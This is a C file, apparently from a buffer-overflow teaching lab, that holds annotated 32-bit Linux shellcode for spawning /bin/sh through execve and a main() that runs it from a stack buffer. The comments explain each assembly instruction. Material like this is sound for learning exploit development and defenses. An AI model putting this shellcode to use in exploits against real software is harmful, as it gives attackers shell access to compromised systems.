/* call_shellcode.c  */

/*A program that creates a file containing code for launching shell*/
#include <stdlib.h>
#include <stdio.h>


/*
The third instruction pushes “//sh”, rather than “/sh” into the stack. This is because we need a 32-bit number here, and “/sh” has only 24 bits. Fortu- nately, “//” is equivalent to “/”

Line 5 stores name[0] to %ebx;
Line 8 stores name to %ecx; 
Line 9 sets %edx to zero.
   MEANING: (cdq)
	 copies the sign(bit31)of the value in the EAX register (which is 0 at this point) into every bit position in the EDX 		register, basically setting %edx to 0.
Line 11: the system call execve() is called when we set %al to 11, and execute “int $0x80”.
*/


/** PROGRAM NOT ASSEMBLED **/

/**
int main( ) {
   char *name[2];
   name[0] = ‘‘/bin/sh’’;
   name[1] = NULL;
   execve(name[0], name, NULL);
}
**/

const char code[] =
  "\x31\xc0"             /* xorl    %eax,%eax            1  */
  "\x50"                 /* pushl   %eax                 2  */
  "\x68""//sh"           /* pushl   $0x68732f2f          3  */
  "\x68""/bin"           /* pushl   $0x6e69622f          4  */
  "\x89\xe3"             /* movl    %esp,%ebx            5  */
  "\x50"                 /* pushl   %eax                 6  */
  "\x53"                 /* pushl   %ebx                 7  */
  "\x89\xe1"             /* movl    %esp,%ecx            8  */
  "\x99"                 /* cdq                          9  */
  "\xb0\x0b"             /* movb    $0x0b,%al            10  */
  "\xcd\x80"             /* int     $0x80                11  */
;

int main(int argc, char **argv)
{
   char buf[sizeof(code)];
   strcpy(buf, code);
   ((void(*)( ))buf)( );
} 
